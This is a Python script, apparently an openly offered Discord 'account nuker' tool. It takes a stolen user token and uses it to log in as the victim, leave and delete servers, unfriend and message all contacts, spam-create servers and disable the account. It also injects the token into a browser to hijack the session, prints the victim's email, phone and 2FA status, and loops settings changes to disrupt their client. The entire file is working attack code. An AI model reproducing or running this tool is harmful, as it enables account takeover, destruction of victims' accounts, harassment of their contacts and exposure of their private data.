import discord
import asyncio
import codecs
import sys
import io
import random
import threading
import requests
import discord
import os
import colorama
from discord.ext import commands
from discord.ext.commands import Bot

import pyfiglet
from pyfiglet import Figlet

from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle

init(convert=True)
clear = lambda: os.system('clear')
clear()

bot = commands.Bot(command_prefix='-', self_bot=True)
bot.remove_command("help")

token = input(
    """\033[95m
	
	                                                                                   


                                                           
	
\033[91m
                           hellalley runs you
                            彼女の腕の中で死ぬ"""
    "\033[91m\n\n                   ╔══════════════════════════════╗\n                         Paste Token Down Below\n                   ╚══════════════════════════════╝\n                   Enter Valid Token:\033[00m"
)
head = {'Authorization': str(token)}
src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)

if src.status_code == 200:
    print('Token Is Valid')
    input("Press Any Key To Continue...")
else:
    print('Invalid/Incorrect Token Try Again')
    input("Press Any Key To Exit...")
    exit(0)

print('Use Any Option Down Below Between 1 - 8 To Nuke Users Account')

print('\n')
print('1 - NUKE')
print('2 - REMOVE ALL FRIENDS')
print('3 - DELETE AND LEAVE ALL SERVERS')
print('4 - SPAM THE USER WITH SERVERS')
print('5 - DISABLE WHOLE ACCOiUNT')
print('6 - LOGIN WITH USERS TOKEN')
print('7 - SCRAPE/COLLECT USERS ACCOUNT INFO')
print('8 - SPAM THE USER WITH DARK/LIGHTMODE')
print('\n')


def nuke():
    print("Loading...")
    print('\n')

    @bot.event
    async def on_ready(times: int = 100):

        print('STATUS : [NUKE]')
        print('\n')
        print('1 - LEAVING SERVERS')
        print('\n')

        for guild in bot.guilds:
            try:
                await guild.leave()
                print(f'left [{guild.name}]')
            except:
                print(f'CANT LEAVE [{guild.name}]')
        print('\n')
        print('2 - DELETING OWNED SERVERS')
        print('\n')
        for guild in bot.guilds:
            try:
                await guild.delete()
                print(f'[{guild.name}] has been deleted')
            except:
                print(f'CANT DELETE [{guild.name}]')

        print('\n')
        print('3 - REMOVING ALL FRIENDS')
        print('\n')

        for user in bot.user.friends:
            try:
                await user.dm_channel.send('https://github.com/hellalley Tools || hellalley owns me')
                await user.remove_friend()
                print(f'unfriended {user}')
            except:
                print(f"CAN'T UNFRIEND {user}")

        print('\n')
        print('4 - SPAMMING SERVERS')
        print('\n')

        for i in range(times):
            await bot.create_guild('hellalley nuked', region=None, icon=None)
            print(f'{i} Server Created')
        print('\n')
        print('Max server limit is [100]')
        print('\n')
        print('\n')
        print('5 - CRASHING DISCORD')
        print('\n')

        print('\n')
        print("CRASHING THE TOKEN OWNER'S DISCORD...")
        print(
            'IF YOU WANNA KEEP GIVING TOKEN OWNER A STROKE THEN KEEP THIS EXE RUNNING'
        )
        headers = {'Authorization': token}
        modes = cycle(["light", "dark"])
        while True:
            setting = {
                'theme': next(modes),
                'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])
            }
            requests.patch(
                "https://discord.com/api/v6/users/@me/settings",
                headers=headers,
                json=setting)

    bot.run(token, bot=False)


def unfriender():
    print("Starting...")

    @bot.event
    async def on_ready():
        print('STATUS : [UNFRIENDING]')

        for user in bot.user.friends:
            try:
                embed=discord.Embed(title="Nuking Account", description="Purging Friends List", color=0x0000ff) 
                embed.set_author(name="痛みの地獄") 
                embed.set_footer(text="blood#4719 - https://github.com/hellalley")
                embed.set_image(url="https://cdn.discordapp.com/attachments/913488960737652799/913503409599029328/FinalVideo_1637866020.905968_online-video-cutter.com.gif") 
                await user.dm_channel.send(embed=embed)
                await user.remove_friend()
                print(f'unfriended {user}')
            except:
                print(f"CAN'T UNFRIEND {user}")

        print('\n')
        print(
            '[SUCCESSFULLY REMOVED ALL FRIENDS || Close and Reopen File To Use Again]')
        print('\n')

    bot.run(token, bot=False)


#### server leaver
def leaver():
    print("Loading...")
    #bot.logout

    @bot.event
    async def on_ready():
        print('STATUS : [SERVER LEAVER]')

        for guild in bot.guilds:
            try:
                await guild.leave()
                print(f'left [{guild.name}]')
            except:
                print(f'Unable to Leave [{guild.name}] So it will be deleted')

        for guild in bot.guilds:
            try:
                await guild.delete()
                print(f'[{guild.name}] has been deleted')
            except:
                print(f"CAN'T DELETE [{guild.name}]")

        print('\n')
        print('[USER HAS LEFT ALL SERVERS || Close and Reopen File To Use Again]')
        print('\n')

    bot.run(token, bot=False)


#### spam servers
def spamservers():
    print("Loading...")

    @bot.event
    async def on_ready(times: int = 95):
        print('STATUS : [SERVER SPAMMER]')

        for i in range(times):
            await bot.create_guild(
                'Account Fucked By hellalley', region=None, icon=None)
            print(f'{i} useless server created')

        print('SUCCESSFULLY CREATED 100 SERVERS')
        print('\n')
        print('[USER HAS REACHED MAX SERVERS|| Close and Reopen File To Use Again]')
        print('\n')
        input()

    bot.run(token, bot=False)


def tokenDisable(token):
    print('STATUS : [DISABLING TOKEN]')
    r = requests.patch(
        'https://discordapp.com/api/v6/users/@me',
        headers={'Authorization': token})
    if r.status_code == 400:
        print(f'Account Has Been Disabled')
        input("Press any key to exit...")
    else:
        print(f'Invalid token')
        input("Press any key to exit...")


def tokenLogin(token):
    print('STATUS : [LOGIN WITH TOKEN]')
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }
            """
    driver.get("https://discord.com/login")
    driver.execute_script(script + f'\nlogin("{token}")')


def tokenInfo(token):
    print('STATUS : [TOKEN INFO]')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
        userName = r.json()['username'] + '#' + r.json()['discriminator']
        userID = r.json()['id']
        phone = r.json()['phone']
        email = r.json()['email']
        mfa = r.json()['mfa_enabled']
        print(f'''
            [{Fore.RED}User ID{Fore.RESET}]         {userID}
            [{Fore.RED}User Name{Fore.RESET}]       {userName}
            [{Fore.RED}2 Factor{Fore.RESET}]        {mfa}
            [{Fore.RED}Email{Fore.RESET}]           {email}
            [{Fore.RED}Phone number{Fore.RESET}]    {phone if phone else ""}
            [{Fore.RED}Token{Fore.RESET}]           {token}
            ''')
        input()


def crashdiscord(token):
    print('STATUS : [DISCORD CRASHER]')
    print('\n')
    print('CRASHING THE TOKEN OWNER DISCORD...')
    print('IF YOU WANNA KEEP CRASHING HIS DISCORD KEEP THE TOOL WORKING')
    headers = {'Authorization': token}
    modes = cycle(["light", "dark"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])
        }
        requests.patch(
            "https://discord.com/api/v6/users/@me/settings",
            headers=headers,
            json=setting)


def mainanswer():
  
    answer = input('\033[1;00m[\033[91mSelection\033[1;00m]-\033[91m地獄\033[00m Choose Option On The List: ')
    if answer == '1':
        nuke()
    elif answer == '2':
        unfriender()
    elif answer == '3':
        leaver()
    elif answer == '4':
        spamservers()
    elif answer == '5':
        tokenDisable(token)
    elif answer == '6':
        tokenLogin(token)
    elif answer == '7':
        tokenInfo(token)
    elif answer == '8':
        crashdiscord(token)
    else:
        print('Thats not a Valid Option please close and retry again')
        mainanswer()


mainanswer()
